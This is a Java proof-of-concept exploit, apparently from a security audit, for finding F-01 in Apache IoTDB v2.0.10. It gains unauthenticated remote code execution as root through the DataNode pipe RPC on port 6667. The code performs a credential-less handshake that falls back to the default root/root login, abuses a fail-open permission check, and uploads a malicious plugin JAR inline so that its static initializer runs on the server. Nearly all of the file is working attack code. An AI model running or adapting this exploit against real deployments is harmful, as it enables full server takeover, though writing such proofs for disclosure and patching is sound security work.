import org.apache.iotdb.service.rpc.thrift.*;
import org.apache.iotdb.common.rpc.thrift.TSStatus;
import org.apache.iotdb.confignode.consensus.request.write.pipe.plugin.CreatePipePluginPlan;
import org.apache.iotdb.commons.pipe.agent.plugin.meta.PipePluginMeta;
import org.apache.tsfile.utils.Binary;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * F-01 — Unauthenticated RCE as root via the pipe config-plane (DataNode client RPC, port 6667).
 *
 * Chain (Apache IoTDB v2.0.10, commit 3c26382b):
 *   1. IoTDBFileReceiver.handleTransferHandshakeV2 (:283-300) keeps username/password at the
 *      CONNECTOR_IOTDB_{USER,PASSWORD}_DEFAULT_VALUE initialisers (:82-83) when the handshake
 *      omits them; those constants are literally "root"/"root" (PipeSinkConstant.java:91,98).
 *      => an unauthenticated peer authenticates as root WHEN root's password is still the default.
 *   2. IoTDBConfigNodeReceiver.checkPermission enumerates 75 of the ConfigPhysicalPlanType values,
 *      then `default: return StatusUtils.OK;` (:683) — 103 of 178 factory-parseable plan types
 *      execute unauthorized.
 *   3. CreatePipePlugin carries the JAR inline; PipePluginInfo.computeFromPluginClass runs
 *      Class.forName(className, initialize=true, loader) (:311) => static initializer executes.
 *
 * Precondition: the omit-credentials tier requires root's password to still be the shipped default.
 * If it was rotated, this exact path returns 801 (Authentication failed) and the attack downgrades
 * to "any authenticated user" via the same fail-open switch + PipeEnrichedPlan wrapper.
 *
 * Usage: java F01_PipeConfigPlanRce <host> <6667> <path-to-raptorplugin.jar>
 */
public class F01_PipeConfigPlanRce {
  public static void main(String[] a) throws Exception {
    String host = a.length > 0 ? a[0] : "127.0.0.1";
    int port    = a.length > 1 ? Integer.parseInt(a[1]) : 6667;
    String jarPath = a.length > 2 ? a[2] : "/poc/raptorplugin.jar";
    byte[] jar = Files.readAllBytes(Paths.get(jarPath));

    System.out.println("[F-01] " + Common.ts() + "  target=" + host + ":" + port
        + "  (no openSession, no credentials)");

    IClientRPCService.Client c = Common.clientRpc(host, port);

    // Step 1: unauthenticated pipe handshake (credentials omitted -> root/root default).
    Map<String, String> hs = new LinkedHashMap<>();
    hs.put("clusterID", "validation-attacker-cluster");
    hs.put("timestampPrecision", "ms");
    TSStatus hsSt = c.pipeTransfer(new TPipeTransferReq(
        Common.VERSION_1, Common.HANDSHAKE_CONFIGNODE_V2, Common.handshakeBody(hs))).getStatus();
    System.out.println("[F-01] handshake (zero credentials)   -> " + Common.code(hsSt));
    if (hsSt.getCode() != 200) {
      System.out.println("[F-01] RESULT: handshake refused (code " + hsSt.getCode()
          + "). Expected on a HARDENED deployment where root's password was rotated. "
          + "On stock root/root this returns 200.");
      return;
    }

    // Step 2: TRANSFER_CONFIG_PLAN carrying CreatePipePlugin with an INLINE malicious JAR.
    MessageDigest md = MessageDigest.getInstance("MD5");
    StringBuilder sb = new StringBuilder();
    for (byte b : md.digest(jar)) sb.append(String.format("%02x", b));
    PipePluginMeta meta = new PipePluginMeta(
        "validationplugin", "org.apache.iotdb.raptor.RaptorPlugin",
        false, "validationplugin.jar", sb.toString());
    CreatePipePluginPlan plan = new CreatePipePluginPlan(meta, new Binary(jar));
    TSStatus st = c.pipeTransfer(new TPipeTransferReq(
        Common.VERSION_1, Common.TRANSFER_CONFIG_PLAN, plan.serializeToByteBuffer())).getStatus();
    System.out.println("[F-01] CreatePipePlugin (inline JAR)  -> " + Common.code(st));
    System.out.println("[F-01] " + Common.ts()
        + "  If code=200, the plugin class static initializer ran on the server (see /tmp marker + server log).");
  }
}
